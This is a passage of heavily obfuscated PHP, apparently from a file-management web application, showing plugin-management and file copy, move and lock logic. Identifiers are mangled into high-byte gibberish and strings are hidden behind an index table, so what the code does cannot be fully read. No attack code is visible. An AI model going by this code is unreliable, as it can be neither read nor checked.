$_SERVER[¡¬ıÜ ƒ]; if (!$ÂÙ–…şô || !$üÇ…Úå…) { return !1; } if (is_array($üÇ…Úå…)) { $üÇ…Úå… = array($Ç˜î»ïº[7], $üÇ…Úå…); } $¤Ò°¡Œ = array($Ç˜î»ïº[1776] => 0, $Ç˜î»ïº[497] => $üÇ…Úå…, $Ç˜î»ïº[559] => array($Ç˜î»ïº[1102], 0), $Ç˜î»ïº[498] => $Ç˜î»ïº[2109] . $ÂÙ–…şô); return $this->where($¤Ò°¡Œ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\56\x70\x6c\165\147\151\x6e\114\151\x73\x74"; public $field = array("\156\x61\x6d\x65", "\x73\x74\x61\164\x75\163", "\162\145\x67\151\x65\163\164", "\143\x6f\x6e\146\151\147"); public function loadList($‰ß®â‹’ = false) { $ƒÕı«Î½ = array_to_keyvalue($this->listData(), $_SERVER[¡¬ıÜ ƒ][32]); if ($‰ß®â‹’) { return $ƒÕı«Î½[$‰ß®â‹’]; } return $ƒÕı«Î½; } public function init() { $¸¯·²¹È =& $_SERVER[¡¬ıÜ ƒ]; Hook::trigger($¸¯·²¹È[2110]); $Ïè±Œšœ = $this->loadPluginList(); foreach ($Ïè±Œšœ as $ªú†ŸÊİ => $¤ÀÍìˆ) { $œéûä¡û = $this->appAllow($ªú†ŸÊİ, $¤ÀÍìˆ); if (!$œéûä¡û) { continue; } foreach ($¤ÀÍìˆ[$¸¯·²¹È[2111]] as $êÆ¹úÜ¹ => $ß¢íÁÎ) { Hook::bind($êÆ¹úÜ¹, $ß¢íÁÎ); } } Hook::trigger($¸¯·²¹È[2112]); Hook::trigger(ACTION); } public function appAllow($²‚¯Ü’, $ÄÎóñŞâ, $Î®ÁïÎó = true) { $°®×ˆßñ =& $_SERVER[¡¬ıÜ ƒ]; $Ó†º§ªÌ = PLUGIN_DIR . $²‚¯Ü’ . $°®×ˆßñ[2113]; if (!is_array($ÄÎóñŞâ) || !is_array($ÄÎóñŞâ[$°®×ˆßñ[2111]]) || $ÄÎóñŞâ[$°®×ˆßñ[830]] != 1 || !is_file($Ó†º§ªÌ)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$°®×ˆßñ[6]][$°®×ˆßñ[2114]] || !$GLOBALS[$°®×ˆßñ[6]][$°®×ˆßñ[2115]]) { return !0; } $èÅ¬Ùˆ¿ = explode($°®×ˆßñ[50], strtolower($GLOBALS[$°®×ˆßñ[6]][$°®×ˆßñ[2115]])); return in_array(strtolower($²‚¯Ü’), $èÅ¬Ùˆ¿) ? !1 : !0; } if ($Î®ÁïÎó && !Action($°®×ˆßñ[2116])->checkAuth($²‚¯Ü’)) { return !1; } return !0; } public function unInstall($§š²Ê´“) { $½®¹ÜÈ =& $_SERVER[¡¬ıÜ ƒ]; $é×ŠùÚ = $this->loadList($§š²Ê´“); if (file_exists(PLUGIN_DIR . $§š²Ê´“)) { Hook::apply($§š²Ê´“ . $½®¹ÜÈ[2117]); } $this->remove($é×ŠùÚ[$½®¹ÜÈ[477]]); } public function changeStatus($‚ìù‡±ç, $ÓŒ“ª) { $ùğŸ˜üÜ =& $_SERVER[¡¬ıÜ ƒ]; $È´ŠÆı” = $this->loadList($‚ìù‡±ç); if ($ÓŒ“ª) { Hook::apply($‚ìù‡±ç . $ùğŸ˜üÜ[2118]); } $this->update($È´ŠÆı”[$ùğŸ˜üÜ[477]], array($ùğŸ˜üÜ[2119] => $ÓŒ“ª)); } public function appRegist($Øô¥…Šƒ, $ï‡ÉìÚú) { $œÙËôŒ… =& $_SERVER[¡¬ıÜ ƒ]; $²¤Áı¼ü = $this->loadList($Øô¥…Šƒ); if ($²¤Áı¼ü) { $this->update($²¤Áı¼ü[$œÙËôŒ…[477]], array($œÙËôŒ…[2111] => $ï‡ÉìÚú)); } else { $É¥°â‚ƒ = array($œÙËôŒ…[32] => $Øô¥…Šƒ, $œÙËôŒ…[2111] => $ï‡ÉìÚú, $œÙËôŒ…[830] => 0, $œÙËôŒ…[6] => $this->getConfigDefault($Øô¥…Šƒ)); $this->insert($É¥°â‚ƒ); } } public function getConfigDefault($Îöò“¼Â) { $á£»äĞé =& $_SERVER[¡¬ıÜ ƒ]; $¯¥ñºÜá = array(); $şÒ’äÆ¾ = $this->getPackageJson($Îöò“¼Â); if (!$şÒ’äÆ¾ && is_array($şÒ’äÆ¾[$á£»äĞé[2120]])) { return $¯¥ñºÜá; } foreach ($şÒ’äÆ¾[$á£»äĞé[2120]] as $÷¨ÛÊ–’ => $çËæ‡ ş) { if (!isset($çËæ‡ ş[$á£»äĞé[452]]) || isset($¯¥ñºÜá[$÷¨ÛÊ–’])) { continue; } $¯¥ñºÜá[$÷¨ÛÊ–’] = $çËæ‡ ş[$á£»äĞé[452]]; } return $¯¥ñºÜá; } public function getPackageJson($ã­Ë‡æÄ) { return Hook::apply($ã­Ë‡æÄ . $_SERVER[¡¬ıÜ ƒ][2121]); } public function getConfig($Û¸Â–, $ßŒ„Şê = false) { $—õß³èª =& $_SERVER[¡¬ıÜ ƒ]; $ŠÚ°÷û = array(); $‚–òã× = $this->loadList($Û¸Â–); if ($‚–òã× && is_array($‚–òã×[$—õß³èª[6]])) { $ŠÚ°÷û = $‚–òã×[$—õß³èª[6]]; } if (!$ŠÚ°÷û || $ßŒ„Şê) { $ŠÚ°÷û = $this->getConfigDefault($Û¸Â–); } return $ŠÚ°÷û; } public function setConfig($ŞçŸŞ»å, $Ë¨Ä“ ó = false) { $ˆ½ËÙ‚€ =& $_SERVER[¡¬ıÜ ƒ]; $”´¥›« = $this->loadList($ŞçŸŞ»å); if (!$”´¥›«) { return !1; } $ê«©œö™ = $”´¥›«[$ˆ½ËÙ‚€[6]]; if ($Ë¨Ä“ ó == !1) { $ê«©œö™ = array(); $Ë¨Ä“ ó = $this->getConfigDefault($ŞçŸŞ»å); } foreach ($Ë¨Ä“ ó as $ä•ß½åÒ => $£¹Ù–Ê ) { $ê«©œö™[$ä•ß½åÒ] = is_string($£¹Ù–Ê ) ? trim($£¹Ù–Ê ) : $£¹Ù–Ê ; } $this->update($”´¥›«[$ˆ½ËÙ‚€[477]], array($ˆ½ËÙ‚€[6] => $ê«©œö™)); } public function viewList() { $°•˜àÉ =& $_SERVER[¡¬ıÜ ƒ]; $çº‡üË¨ = $this->loadList(); $this->pluginScan($çº‡üË¨); $çº‡üË¨ = $this->loadPluginList(); $ç§»“¹à = array(); foreach ($çº‡üË¨ as $Ğ•ÒÛÔ => $œÀîÁƒ‰) { $òé¦ïÊ = $œÀîÁƒ‰; unset($œÀîÁƒ‰[$°•˜àÉ[2111]], $œÀîÁƒ‰[$°•˜àÉ[6]]); $÷Ì‡Ù¨ = PLUGIN_DIR . $œÀîÁƒ‰[$°•˜àÉ[32]] . $°•˜àÉ[2113]; if (!is_file($÷Ì‡Ù¨)) { continue; } $’øä«½ = Hook::apply($œÀîÁƒ‰[$°•˜àÉ[32]] . $°•˜àÉ[2121]); if (!is_array($’øä«½)) { continue; } $ç§»“¹à[$Ğ•ÒÛÔ] = array_merge($œÀîÁƒ‰, $’øä«½); if ($òé¦ïÊ[$°•˜àÉ[6]][$°•˜àÉ[1696]] != $’øä«½[$°•˜àÉ[1670]]) { Hook::apply($œÀîÁƒ‰[$°•˜àÉ[32]] . $°•˜àÉ[2118]); $òé¦ïÊ[$°•˜àÉ[6]][$°•˜àÉ[1696]] = $’øä«½[$°•˜àÉ[1670]]; $this->update($œÀîÁƒ‰[$°•˜àÉ[477]], array($°•˜àÉ[6] => $òé¦ïÊ[$°•˜àÉ[6]])); } } return $ç§»“¹à; } private function loadPluginList() { $æ§Ôè€ˆ =& $_SERVER[¡¬ıÜ ƒ]; $‡Ôü…òÇ = $this->loadList(); if (strtolower(MOD) == $æ§Ôè€ˆ[2122]) { return $‡Ôü…òÇ; } $Œêõô˜‡ = Hook::trigger($æ§Ôè€ˆ[2123], $‡Ôü…òÇ); if ($‡Ôü…òÇ && !$Œêõô˜‡) { die; } return $Œêõô˜‡ ? $Œêõô˜‡ : $‡Ôü…òÇ; } private function pluginScan($‚™¢ø™¦) { $Ö”ùü¾à =& $_SERVER[¡¬ıÜ ƒ]; recursion_dir(PLUGIN_DIR, $¶¼ì²–…, $÷¡×¸¤Á, 0); foreach ($¶¼ì²–… as $°Ğ‘ÅÏ¶) { $ÑÃèšÂ = get_path_this($°Ğ‘ÅÏ¶); if (isset($‚™¢ø™¦[$ÑÃèšÂ]) || !file_exists($°Ğ‘ÅÏ¶ . $Ö”ùü¾à[2124]) || !file_exists($°Ğ‘ÅÏ¶ . $Ö”ùü¾à[2113])) { continue; } Hook::apply($ÑÃèšÂ . $Ö”ùü¾à[2118]); } } } goto a›ùïƒ°ğŞ; bàõ©ö‰åã: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($íó¾ÇŠ) { $´‰· š· =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->allowLock()) { return; } $this->_lockCheck($´‰· š·[623], $íó¾ÇŠ); $ÇÖü×ËÙ = 1; $this->_lockEvent($íó¾ÇŠ, array($´‰· š·[624], $´‰· š·[625]), $ÇÖü×ËÙ); $this->_lockParent($íó¾ÇŠ, array($´‰· š·[625]), $ÇÖü×ËÙ); $this->_lockEvent($íó¾ÇŠ, array($´‰· š·[626], $´‰· š·[627]), $ÇÖü×ËÙ); $this->_lockCheckEnd($´‰· š·[623], $íó¾ÇŠ); } public function lockCopyEnd($é¶ã©æº) { $âªø«ßÇ =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->allowLock()) { return; } $ŞÃÓ¸Å = 0; $this->_lockEvent($é¶ã©æº, array($âªø«ßÇ[624], $âªø«ßÇ[625]), $ŞÃÓ¸Å); $this->_lockParent($é¶ã©æº, array($âªø«ßÇ[625]), $ŞÃÓ¸Å); $this->_lockEvent($é¶ã©æº, array($âªø«ßÇ[626], $âªø«ßÇ[627]), $ŞÃÓ¸Å); } public function lockWriteStart($ò¿ô¤‡£, $ñ§ßàì÷ = '') { $‡ş‚Æå§ =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->allowLock()) { return; } $this->_lockCheck($‡ş‚Æå§[624], $ò¿ô¤‡£); $ÉÆÙŸÔÂ = 1; $this->_lockKey($‡ş‚Æå§[628] . $ò¿ô¤‡£ . $‡ş‚Æå§[10] . $ñ§ßàì÷, $ÉÆÙŸÔÂ); $this->_lockEvent($ò¿ô¤‡£, array($‡ş‚Æå§[623], $‡ş‚Æå§[625]), $ÉÆÙŸÔÂ); $this->_lockParent($ò¿ô¤‡£, array($‡ş‚Æå§[623], $‡ş‚Æå§[625]), $ÉÆÙŸÔÂ); $this->_lockCheckEnd($‡ş‚Æå§[624], $ò¿ô¤‡£); } public function lockWriteEnd($×Ä¿âÍ˜, $àè€±Á’ = '') { $Ååü–¡ó =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->allowLock()) { return; } $Âà€µ³¼ = 0; $this->_lockKey($Ååü–¡ó[628] . $×Ä¿âÍ˜ . $Ååü–¡ó[10] . $àè€±Á’, $Âà€µ³¼); $this->_lockEvent($×Ä¿âÍ˜, array($Ååü–¡ó[623], $Ååü–¡ó[625]), $Âà€µ³¼); $this->_lockParent($×Ä¿âÍ˜, array($Ååü–¡ó[623], $Ååü–¡ó[625]), $Âà€µ³¼); } public function lockMoveStart($ƒÛ ÈéË) { $Í—Õß§ù =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->allowLock()) { return; } $this->_lockCheck($Í—Õß§ù[625], $ƒÛ ÈéË); $„ÕÙ Â· = 1; $this->_lockKey($Í—Õß§ù[629] . $ƒÛ ÈéË, $„ÕÙ Â·); $this->_lockEvent($ƒÛ ÈéË, array($Í—Õß§ù[623], $Í—Õß§ù[624]), $„ÕÙ Â·); $this->_lockParent($ƒÛ ÈéË, array($Í—Õß§ù[623], $Í—Õß§ù[625]), $„ÕÙ Â·); $this->_lockEvent($ƒÛ ÈéË, array($Í—Õß§ù[630], $Í—Õß§ù[626], $Í—Õß§ù[627]), $„ÕÙ Â·); $this->_lockCheckEnd($Í—Õß§ù[625], $ƒÛ ÈéË); } public function lockMoveEnd($Ü·Í¦…) { $Ñ¥¼ó¼ =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->allowLock()) { return; } $Ç»¡Â€† = 0; $this->_lockKey($Ñ¥¼ó¼[629] . $Ü·Í¦…, $Ç»¡Â€†); $this->_lockEvent($Ü·Í¦…, array($Ñ¥¼ó¼[623], $Ñ¥¼ó¼[624]), $Ç»¡Â€†); $this->_lockParent($Ü·Í¦…, array($Ñ¥¼ó¼[623], $Ñ¥¼ó¼[625]), $Ç»¡Â€†); $this->_lockEvent($Ü·Í¦…, array($Ñ¥¼ó¼[630], $Ñ¥¼ó¼[626], $Ñ¥¼ó¼[627]), $Ç»¡Â€†); } private function _lockCheck($öğ´¨İ…, $²íèıÉğ) { $˜­É•» =& $_SERVER[¡¬ıÜ ƒ]; $¶è…„şº = $this->sourceInfo($²íèıÉğ); $áÙÁ = $öğ´¨İ… . $˜­É•»[10] . $²íèıÉğ; $this->_lockTimeStart[$áÙÁ] = timeFloat(); if (!is_array($¶è…„şº)) { return; } $«ªìËµ™ = LNG($˜­É•»[631]); CacheLock::setErrorMsg($˜­É•»[176] . htmlspecialchars($¶è…„şº[$˜­É•»[32]]) . $˜­É•»[178] . $«ªìËµ™); $this->_lockKey($áÙÁ, 1); $this->_lockKey($áÙÁ, 0); $òÍ½ÛÔí = array_reverse($this->parentLevelArray($¶è…„şº[$˜­É•»[586]])); foreach ($òÍ½ÛÔí as $Æç®ˆ¼) { $áÙÁ = $öğ´¨İ… . $˜­É•»[632] . $Æç®ˆ¼; if (CacheLock::lockGet($˜­É•»[633] . $áÙÁ)) { $¶è…„şº = $this->sourceInfo($Æç®ˆ¼); CacheLock::setErrorMsg($˜­É•»[176] . htmlspecialchars($¶è…„şº[$˜­É•»[32]]) . $˜­É•»[178] . $«ªìËµ™); $this->_lockKey($áÙÁ, 1); $this->_lockKey($áÙÁ, 0); } } } private function _lockCheckEnd($÷å¿Ì‘§, $È  ”½—) { $÷¾ßÁÑË =& $_SERVER[¡¬ıÜ ƒ]; $ğûÖàü = $÷å¿Ì‘§ . $÷¾ßÁÑË[10] . $È  ”½—; CacheLock::setErrorMsg($÷¾ßÁÑË[456]); if (!isset($this->_lockTimeStart[$ğûÖàü])) { return; } $£å”Ú»ú = timeFloat() - $this->_lockTimeStart[$ğûÖàü]; unset($this->_lockTimeStart[$ğûÖàü]); if ($£å”Ú»ú > 0.5) { unset(self::$cacheSourceInfo[$÷¾ßÁÑË[535] . $È  ”½—]); } $´Â²ı§ = $this->sourceInfo($È  ”½—); if (!$´Â²ı§) { show_json(LNG($÷¾ßÁÑË[108]), !1); } } private function _lockParent($´†ÄÍÜÓ, $°ŞŒÂƒ, $Û•š‰ì‚) { if (!$this->autoLockSet) { return; } $ŞÁ÷­¼ = $this->sourceInfo($´†ÄÍÜÓ); if (!is_array($ŞÁ÷­¼)) { return; } $©Ã”Ø½ë = array_reverse($this->parentLevelArray($ŞÁ÷­¼[$_SERVER[¡¬ıÜ ƒ][586]])); foreach ($©Ã”Ø½ë as $·àçà‹è) { $this->_lockEvent($·àçà‹è, $°ŞŒÂƒ, $Û•š‰ì‚); } } private function _lockEvent($Ö¨¿”ë÷, $ãÊİ¾™î, $ÛùÔõ°Ğ) { $ó©ÕòŞ =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->autoLockSet) { return; } foreach ($ãÊİ¾™î as $…°Åïí) { $±¢œ³ä = $…°Åïí . $ó©ÕòŞ[10] . $Ö¨¿”ë÷; if ($ÛùÔõ°Ğ && CacheLock::lockGet($ó©ÕòŞ[633] . $±¢œ³ä)) { continue; } $this->_lockKey($±¢œ³ä, $ÛùÔõ°Ğ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($¨áúğü, $ı” âì = 1) { $ºé×§ƒ = $_SERVER[¡¬ıÜ ƒ][633] . md5($¨áúğü); if ($ı” âì) { if (isset(self::$_lockItemArr[$ºé×§ƒ])) { return; } self::$_lockItemArr[$ºé×§ƒ] = 1; CacheLock::lock($ºé×§ƒ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ºé×§ƒ])) { return; } unset(self::$_lockItemArr[$ºé×§ƒ]); CacheLock::unlock($ºé×§ƒ); } } public function isParentOf($Â¡Êõ, $”²Âãîâ) { $¨µ„Î =& $_SERVER[¡¬ıÜ ƒ]; $ßâøÎï¾ = $this->sourceInfo($Â¡Êõ); $‰¦Ê§Ñº = $this->sourceInfo($”²Âãîâ); $úå¡»Ë = $ßâøÎï¾[$¨µ„Î[586]] . $ßâøÎï¾[$¨µ„Î[193]] . $¨µ„Î[50]; $”±¡ˆÇ¥ = $‰¦Ê§Ñº[$¨µ„Î[586]] . $‰¦Ê§Ñº[$¨µ„Î[193]] . $¨µ„Î[50]; $»ŞÜÉ¯È = strpos($”±¡ˆÇ¥, $úå¡»Ë) === 0; return $»ŞÜÉ¯È; } private $targetIsDelete = 0; public function copy($çÔ¬ªĞÄ, $ä’³óûá, $Ú²ò‹ = REPEAT_REPLACE, $¼İªşì = '') { $ıÉ¤§±‰ =& $_SERVER[¡¬ıÜ ƒ]; $À¡œ™µã = $this->sourceInfo($çÔ¬ªĞÄ); $¬Ş…Åà = $this->sourceInfo($ä’³óûá); if (!$À¡œ™µã || !$¬Ş…Åà || $¬Ş…Åà[$ıÉ¤§±‰[487]] != $ıÉ¤§±‰[91]) { return !1; } if ($this->isParentOf($çÔ¬ªĞÄ, $ä’³óûá)) { return !1; } $ÓâÉ©Ö = $¼İªşì ? $¼İªşì : $À¡œ™µã[$ıÉ¤§±‰[32]]; $this->lockCopyStart($çÔ¬ªĞÄ); $this->lockWriteStart($ä’³óûá, $ÓâÉ©Ö); $„Şà”ËÃ = array($ıÉ¤§±‰[634] => array(), $ıÉ¤§±‰[635] => array(), $ıÉ¤§±‰[636] => array()); $this->targetIsDelete = intval($À¡œ™µã[$ıÉ¤§±‰[507]]); $æéª“’ı = $this->fileNameExistAuto($ä’³óûá, $À¡œ™µã); $ŠÍ¸´Š = $this->_copy($çÔ¬ªĞÄ, $ä’³óûá, $Ú²ò‹, $„Şà”ËÃ, !0, $¼İªşì); $this->_childrenListClear(); $this->lockCopyEnd($çÔ¬ªĞÄ); $this->lockWriteEnd($ä’³óûá, $ÓâÉ©Ö); if ($À¡œ™µã[$ıÉ¤§±‰[487]] == $ıÉ¤§±‰[91] && $æéª“’ı == $ŠÍ¸´Š) { $this->folderSizeResetChildren($æéª“’ı); } Model($ıÉ¤§±‰[637])->addAll($„Şà”ËÃ[$ıÉ¤§±‰[635]], array(), !0); if ($æéª“’ı != $ŠÍ¸´Š || $À¡œ™µã[$ıÉ¤§±‰[487]] == $ıÉ¤§±‰[91]) { Model($ıÉ¤§±‰[638])->eventCopy($ŠÍ¸´Š); } $this->saveAll($„Şà”ËÃ[$ıÉ¤§±‰[636]]); Model($ıÉ¤§±‰[232])->linkAdd($„Şà”ËÃ[$ıÉ¤§±‰[634]]); $this->folderSizeReset($ä’³óûá); $this->updateModifyTime($ä’³óûá); return $ŠÍ¸´Š; } private function _copy($×ò®Û‚Í, $øŒü£ø, $±£«‘Òó, &$†Üƒ…àÕ, $à©Ïë¥‹, $şí• = '') { $ĞŠûİ¨ =& $_SERVER[¡¬ıÜ ƒ]; $Í©º»£ = $this->sourceInfoCache($×ò®Û‚Í); $ëÏÈ¾¶° = $Í©º»£[$ĞŠûİ¨[487]] == $ĞŠûİ¨[91]; $¨…¡ÖÌ‘ = $şí• ? $şí• : $Í©º»£[$ĞŠûİ¨[32]]; $¨ß‹¿Ûœ = $this->fileNameExistAuto($øŒü£ø, $Í©º»£); if ($à©Ïë¥‹) { $this->_childrenAllMake($×ò®Û‚Í); if ($ëÏÈ¾¶° && $¨ß‹¿Ûœ) { $this->_childrenAllMake($¨ß‹¿Ûœ); } } if (!$¨ß‹¿Ûœ) { return $this->_copyCreate($×ò®Û‚Í, $øŒü£ø, $¨…¡ÖÌ‘, $†Üƒ…àÕ); } $Ö¶º»¹é = $¨ß‹¿Ûœ; if ($ëÏÈ¾¶°) { if ($±£«‘Òó == REPEAT_RENAME_FOLDER) { $¨…¡ÖÌ‘ = $this->fileNameAutoCache($øŒü£ø, $¨…¡ÖÌ‘, $±£«‘Òó, $ëÏÈ¾¶°); $Ö¶º»¹é = $this->_copyCreate($×ò®Û‚Í, $øŒü£ø, $¨…¡ÖÌ‘, $†Üƒ…àÕ); } else { $êÉ¿ûìä = $this->_childrenList($×ò®Û‚Í); foreach ($êÉ¿ûìä as $í·Ë¢´) { $this->_copy($í·Ë¢´[$ĞŠûİ¨[193]], $¨ß‹¿Ûœ, $±£«‘Òó, $†Üƒ…àÕ, !1); } } } else { if ($±£«‘Òó == REPEAT_RENAME || $±£«‘Òó == REPEAT_RENAME_FOLDER) { $¨…¡ÖÌ‘ = $this->fileNameAutoCache($øŒü£ø, $¨…¡ÖÌ‘, $±£«‘Òó, $ëÏÈ¾¶°); $Ö¶º»¹é = $this->_copyCreate($×ò®Û‚Í, $øŒü£ø, $¨…¡ÖÌ‘, $†Üƒ…àÕ); } else { if ($±£«‘Òó == REPEAT_REPLACE) { $İÉãõé™ = $this->sourceInfoCache($¨ß‹¿Ûœ); $ËçàÚ± = $this->fileHistory($İÉãõé™, $Í©º»£[$ĞŠûİ¨[543]], $Í©º»£[$ĞŠûİ¨[79]]); if ($ËçàÚ±) { $†Üƒ…àÕ[$ĞŠûİ¨[634]][] = $Í©º»£[$ĞŠûİ¨[543]]; } } else { if ($±£«‘Òó == REPEAT_SKIP) { } } } Hook::trigger($ĞŠûİ¨[639], array($ĞŠûİ¨[640], $Í©º»£, 0)); } return $Ö¶º»¹é; } private function _copyCreate($äñØ´¡¬, $ê™§ÃØ, $ÊúšÀÇ„, &$×³¬Æ€î) { $ÔÌ·ÎĞà =& $_SERVER[¡¬ıÜ ƒ]; $µáåïÕÏ = $this->sourceInfoCache($äñØ´¡¬); $¼¤èş¦à = $this->sourceInfoCache($ê™§ÃØ); $Ó‚„Ú” = $this->_makeItemData($µáåïÕÏ, $¼¤èş¦à, $ÊúšÀÇ„); Hook::trigger($ÔÌ·ÎĞà[641], $Ó‚„Ú”); Hook::trigger($ÔÌ·ÎĞà[642], array($ÔÌ·ÎĞà[643], $Ó‚„Ú”, 0)); $İ³˜šÒ = $this->add($Ó‚„Ú”); $½È½ŠÏà = array($ÔÌ·ÎĞà[193] => $İ³˜šÒ, $ÔÌ·ÎĞà[32] => $ÊúšÀÇ„); $this->_copyApplyMeta($½È½ŠÏà, $×³¬Æ€î); if ($µáåïÕÏ[$ÔÌ·ÎĞà[487]] != $ÔÌ·ÎĞà[91]) { $×³¬Æ€î[$ÔÌ·ÎĞà[634]][] = $µáåïÕÏ[$ÔÌ·ÎĞà[543]]; return $İ³˜šÒ; } $íÛ¨€Šµ = array(); $—‹…‚ = array(); $this->_childrenListAll($äñØ´¡¬, $íÛ¨€Šµ); $ŸòŸÎ†å = count($íÛ¨€Šµ); if ($ŸòŸÎ†å == 0) { return $İ³˜šÒ; } $ìóäÆ§œ = $this->sourceInfo($İ³˜šÒ); foreach ($íÛ¨€Šµ as $™Àìö©Œ) { $Ó“Êßšò = $this->_makeItemData($™Àìö©Œ, $ìóäÆ§œ, $™Àìö©Œ[$ÔÌ·ÎĞà[32]]); $Ó“Êßšò[$ÔÌ·ÎĞà[586]] = $™Àìö©Œ[$ÔÌ·ÎĞà[586]]; $—‹…‚[] = $Ó“Êßšò; } $this->chunkEventSet($ÔÌ·ÎĞà[644], array($ÔÌ·ÎĞà[645], $Ó‚„Ú”, $ŸòŸÎ†å)); $this->addAll($—‹…‚, array(), !1); $Ö×ìÌ¿ = $this->where(array($ÔÌ·ÎĞà[192] => $İ³˜šÒ))->select(); $öïò™›Õ = $this->_childrenMakeRelation($íÛ¨€Šµ, $Ö×ìÌ¿); $öïò™›Õ[$äñØ´¡¬] = $İ³˜šÒ; $´ÔÑ—Ú = array(); $ƒÆÙ“Üí = array(); foreach ($Ö×ìÌ¿ as $™Àìö©Œ) { $ƒÅü·İ’ = $™Àìö©Œ[$ÔÌ·ÎĞà[193]]; $È’·ô«Â = $this->_childrenMatch($öïò™›Õ, $™Àìö©Œ, $ìóäÆ§œ); $´ÔÑ—Ú[] = array($ÔÌ·ÎĞà[193], $ƒÅü·İ’, $ÔÌ·ÎĞà[192], $È’·ô«Â[$ÔÌ·ÎĞà[192]]); $ƒÆÙ“Üí[] = array($ÔÌ·ÎĞà[193], $ƒÅü·İ’, $ÔÌ·ÎĞà[586], $È’·ô«Â[$ÔÌ·ÎĞà[586]]); $this->_copyApplyMeta($™Àìö©Œ, $×³¬Æ€î); if ($™Àìö©Œ[$ÔÌ·ÎĞà[487]] != $ÔÌ·ÎĞà[91]) { $×³¬Æ€î[$ÔÌ·ÎĞà[634]][] = $™Àìö©Œ[$ÔÌ·ÎĞà[543]]; } } $this->chunkEventSet($ÔÌ·ÎĞà[646], array($ÔÌ·ÎĞà[647], $Ó‚„Ú”, $ŸòŸÎ†å)); $this->saveAll($´ÔÑ—Ú); $this->chunkEventSet($ÔÌ·ÎĞà[648], array($ÔÌ·ÎĞà[649], $Ó‚„Ú”, $ŸòŸÎ†å)); $this->saveAll($ƒÆÙ“Üí); return $İ³˜šÒ; } private function _childrenMakeRelation($™Ü“›Â×, $íÇ“§µÕ) { $ˆ€‘»†’ =& $_SERVER[¡¬ıÜ ƒ]; $¹ÎºîÕ‹ = array(); $ÀÉÂó¥ã = array(); foreach ($™Ü“›Â× as $¯Üæƒ‡½) { $¨¦ŸÍê© = $¯Üæƒ‡½[$ˆ€‘»†’[32]] . $ˆ€‘»†’[8] . $¯Üæƒ‡½[$ˆ€‘»†’[586]]; $¹ÎºîÕ‹[$¨¦ŸÍê©] = $¯Üæƒ‡½[$ˆ€‘»†’[193]]; } foreach ($íÇ“§µÕ as $¯Üæƒ‡½) { $¨¦ŸÍê© = $¯Üæƒ‡½[$ˆ€‘»†’[32]] . $ˆ€‘»†’[8] . $¯Üæƒ‡½[$ˆ€‘»†’[586]]; $éĞˆÙó÷ = $¹ÎºîÕ‹[$¨¦ŸÍê©]; $ÀÉÂó¥ã[$éĞˆÙó÷] = $¯Üæƒ‡½[$ˆ€‘»†’[193]]; } return $ÀÉÂó¥ã; } private function _childrenMatch($ıÒ† š, $Ü–çÁç, $”Ãé£Óª) { $ƒÄÜ’çß =& $_SERVER[¡¬ıÜ ƒ]; $ÌÆ±ã œ = $”Ãé£Óª[$ƒÄÜ’çß[586]]; $ÓŒàÈ… = $this->parentLevelArray($Ü–çÁç[$ƒÄÜ’çß[586]]); foreach ($ÓŒàÈ… as $ÜáÌÀÃí) { if (isset($ıÒ† š[$ÜáÌÀÃí])) { $ÌÆ±ã œ .= $ıÒ† š[$ÜáÌÀÃí] . $ƒÄÜ’çß[650]; } } $ÌÆ±ã œ = rtrim($ÌÆ±ã œ, $ƒÄÜ’çß[50]) . $ƒÄÜ’çß[50]; $ ŒàØ½º = $this->parentLevelArray($ÌÆ±ã œ); $È±Áè’ì = $ ŒàØ½º[count($ ŒàØ½º) - 1]; return array($ƒÄÜ’çß[192] => $È±Áè’ì, $ƒÄÜ’çß[586] => $ÌÆ±ã œ); } private function _makeItemData($ë‘‘÷ıü, $“éÏÌÒÁ, $†õÑÒ´®) { $¸½ÏÛ†„ =& $_SERVER[¡¬ıÜ ƒ]; $…ˆšÉ  = array($¸½ÏÛ†„[651] => $ë‘‘÷ıü[$¸½ÏÛ†„[487]], $¸½ÏÛ†„[496] => $†õÑÒ´®, $¸½ÏÛ†„[652] => $ë‘‘÷ıü[$¸½ÏÛ†„[488]] ? $ë‘‘÷ıü[$¸½ÏÛ†„[488]] : $¸½ÏÛ†„[12], $¸½ÏÛ†„[544] => $ë‘‘÷ıü[$¸½ÏÛ†„[543]] ? $ë‘‘÷ıü[$¸½ÏÛ†„[543]] : 0, $¸½ÏÛ†„[622] => $ë‘‘÷ıü[$¸½ÏÛ†„[79]] ? $ë‘‘÷ıü[$¸½ÏÛ†„[79]] : 0, $¸½ÏÛ†„[653] => intval($“éÏÌÒÁ[$¸½ÏÛ†„[190]]), $¸½ÏÛ†„[654] => intval($“éÏÌÒÁ[$¸½ÏÛ†„[571]]), $¸½ÏÛ†„[655] => intval(USER_ID), $¸½ÏÛ†„[656] => intval(USER_ID), $¸½ÏÛ†„[479] => intval($“éÏÌÒÁ[$¸½ÏÛ†„[193]]), $¸½ÏÛ†„[657] => $“éÏÌÒÁ[$¸½ÏÛ†„[586]] . $“éÏÌÒÁ[$¸½ÏÛ†„[193]] . $¸½ÏÛ†„[50], $¸½ÏÛ†„[500] => $ë‘‘÷ıü[$¸½ÏÛ†„[88]] ? $ë‘‘÷ıü[$¸½ÏÛ†„[88]] : time(), $¸½ÏÛ†„[506] => 0, $¸½ÏÛ†„[658] => $¸½ÏÛ†„[12]); return $…ˆšÉ ; } private function _copyApplyMeta($ÚÓñ®´†, &$ºÉä¿áî) { $ÌÑœîßº =& $_SERVER[¡¬ıÜ ƒ]; $Ì™íÒ¨® = $ÚÓñ®´†[$ÌÑœîßº[193]]; $†úú¬µø = $ÚÓñ®´†[$ÌÑœîßº[32]]; if (!isset($ÚÓñ®´†[$ÌÑœîßº[659]]) || !$ÚÓñ®´†[$ÌÑœîßº[659]] || $ÚÓñ®´†[$ÌÑœîßº[659]] == $ÌÑœîßº[230]) { 